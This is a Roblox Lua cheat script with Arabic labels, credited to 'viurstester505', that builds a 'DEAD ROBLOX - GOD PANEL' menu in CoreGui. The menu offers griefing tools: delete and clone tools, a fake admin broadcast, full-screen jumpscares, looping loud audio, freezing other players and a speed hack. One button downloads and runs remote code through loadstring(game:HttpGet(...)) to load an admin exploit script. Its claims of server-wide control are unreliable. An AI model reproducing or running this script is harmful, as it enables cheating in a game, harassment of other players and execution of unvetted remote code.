-- ==========================================
-- [Script Name]: Dead Roblox - Ultimate Owner Control
-- [Creator]: viurstester505
-- [Idea By]: zowb1
-- ==========================================

if not game:IsLoaded() then game.Loaded:Wait() end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Lighting = game:GetService("Lighting")
local StarterGui = game:GetService("StarterGui")
local SoundService = game:GetService("SoundService")

-- 1. واجهة الاعتمادات الرسمية على اليمين
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "DeadRoblox_Ultimate"
ScreenGui.Parent = game.CoreGui

local CreditLabel = Instance.new("TextLabel")
CreditLabel.Parent = ScreenGui
CreditLabel.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
CreditLabel.BackgroundTransparency = 0.2
CreditLabel.Position = UDim2.new(1, -240, 0, 15)
CreditLabel.Size = UDim2.new(0, 230, 0, 70)
CreditLabel.Font = Enum.Font.Code
CreditLabel.TextColor3 = Color3.fromRGB(255, 0, 50)
CreditLabel.TextSize = 13
CreditLabel.TextWrapped = true
CreditLabel.Text = "☠️ [DEAD ROBLOX ULTIMATE]\n👤 Creator: viurstester505\n💡 Idea: zowb1\n⚡ Status: Owner Control"

Instance.new("UICorner", CreditLabel)

-- 2. القائمة الرئيسية
local MainFrame = Instance.new("Frame")
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
MainFrame.Position = UDim2.new(0.5, -180, 0.5, -220)
MainFrame.Size = UDim2.new(0, 360, 0, 420)
MainFrame.Active = true
MainFrame.Draggable = true

Instance.new("UICorner", MainFrame)

local Title = Instance.new("TextLabel")
Title.Parent = MainFrame
Title.Size = UDim2.new(1, 0, 0, 45)
Title.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
Title.Font = Enum.Font.GothamBold
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 16
Title.Text = "☠️ DEAD ROBLOX - GOD PANEL"

local Scroll = Instance.new("ScrollingFrame")
Scroll.Parent = MainFrame
Scroll.Position = UDim2.new(0, 0, 0, 50)
Scroll.Size = UDim2.new(1, 0, 1, -50)
Scroll.BackgroundTransparency = 1
Scroll.CanvasSize = UDim2.new(0, 0, 2.5, 0)

local UIList = Instance.new("UIListLayout", Scroll)
UIList.SortOrder = Enum.SortOrder.LayoutOrder
UIList.Padding = UDim.new(0, 8)

local function createBtn(text, color, callback)
    local btn = Instance.new("TextButton")
    btn.Parent = Scroll
    btn.Size = UDim2.new(0.9, 0, 0, 38)
    btn.Position = UDim2.new(0.05, 0, 0, 0)
    btn.BackgroundColor3 = color
    btn.Font = Enum.Font.SourceSansBold
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextSize = 14
    btn.Text = text
    Instance.new("UICorner", btn)
    btn.MouseButton1Click:Connect(callback)
    return btn
end

-- ==================== الأزرار والوظائف الخارقة ====================

-- 1. إعطاء أدوات Btools حقيقية (حذف وتعديل الأجزاء)
createBtn("🛠️ إعطاء أدوات البناء والحذف (Btools)", Color3.fromRGB(0, 120, 200), function()
    pcall(function()
        local backpack = LocalPlayer.Backpack
        for i = 1, 3 do
            local tool = Instance.new("Tool")
            tool.Name = i == 1 and "حذف (Delete)" or (i == 2 and "نسخ (Clone)" or "تعديل (Move)")
            tool.Parent = backpack
            tool.Activated:Connect(function()
                local mouse = LocalPlayer:GetMouse()
                if mouse.Target then
                    if i == 1 then mouse.Target:Destroy()
                    elseif i == 2 then mouse.Target:Clone().Parent = workspace
                    elseif i == 3 then mouse.Target.Anchored = not mouse.Target.Anchored end
                end
            end)
        end
        StarterGui:SetCore("SendNotification", {Title = "Btools", Text = "تم استلام أدوات التحكم بنجاح!", Duration = 5})
    end)
end)

-- 2. تفعيل أدمن حقيقي وسريع
createBtn("👑 تفعيل صلاحيات الأدمن الشاملة", Color3.fromRGB(150, 0, 150), function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
    end)
end)

-- 3. إرسال رسالة تنبيه علوية لجميع اللاعبين
createBtn("📢 رسالة إدارية عامة للجميع (Broadcast)", Color3.fromRGB(200, 80, 0), function()
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = "🚨 [إعلان إدارة Dead Roblox]",
            Text = "المالك viurstester505 يسيطر على السيرفر بالكامل!",
            Duration = 8,
        })
    end)
end)

-- 4. إظهار صورة مرعبة/عامة بملء الشاشة لكل السيرفر
createBtn("🖼️ إظهار صورة ملء الشاشة للجميع (Jumpscare)", Color3.fromRGB(180, 0, 0), function()
    pcall(function()
        for _, p in pairs(Players:GetPlayers()) do
            if p.PlayerGui then
                local sgi = Instance.new("ScreenGui", p.PlayerGui)
                sgi.Name = "GlobalImage"
                local img = Instance.new("ImageLabel", sgi)
                img.Size = UDim2.new(1, 0, 1, 0)
                img.Image = "rbxassetid://6023426915" -- صورة افتراضية قوية وواضحة
                game:GetService("Debris"):AddItem(sgi, 5) -- تختفي بعد 5 ثواني
            end
        end
    end)
end)

-- 5. تشغيل صوت مزعج جداً ومرعب لكل السيرفر
createBtn("🔊 تشغيل صوت مزعج جداً للكل (Loud Audio)", Color3.fromRGB(220, 20, 60), function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://9069609208" -- صوت صراخ/تنبيه مزعج وعالي
        sound.Volume = 10
        sound.Looped = true
        sound.Parent = SoundService
        sound:Play()
    end)
end)

-- 6. تجميد حركة السيرفر بالكامل
createBtn("🧊 تجميد حركة جميع اللاعبين (Freeze All)", Color3.fromRGB(0, 100, 100), function()
    pcall(function()
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("Humanoid") then
                p.Character.Humanoid.WalkSpeed = 0
                p.Character.Humanoid.JumpPower = 0
            end
        end
    end)
end)

-- 7. تحويل ألوان السيرفر إلى أحمر دموي
createBtn("🔴 تحويل ألوان السيرفر إلى أحمر مرعب", Color3.fromRGB(140, 0, 0), function()
    Lighting.ClockTime = 0
    Lighting.Ambient = Color3.fromRGB(255, 0, 0)
    Lighting.OutdoorAmbient = Color3.fromRGB(255, 0, 0)
    Lighting.FogColor = Color3.fromRGB(100, 0, 0)
    Lighting.FogEnd = 250
end)

-- 8. سرعة المالك الخارقة
createBtn("⚡ تفعيل سرعة المالك القصوى (Speed 250)", Color3.fromRGB(0, 150, 50), function()
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        LocalPlayer.Character.Humanoid.WalkSpeed = 250
    end
end)
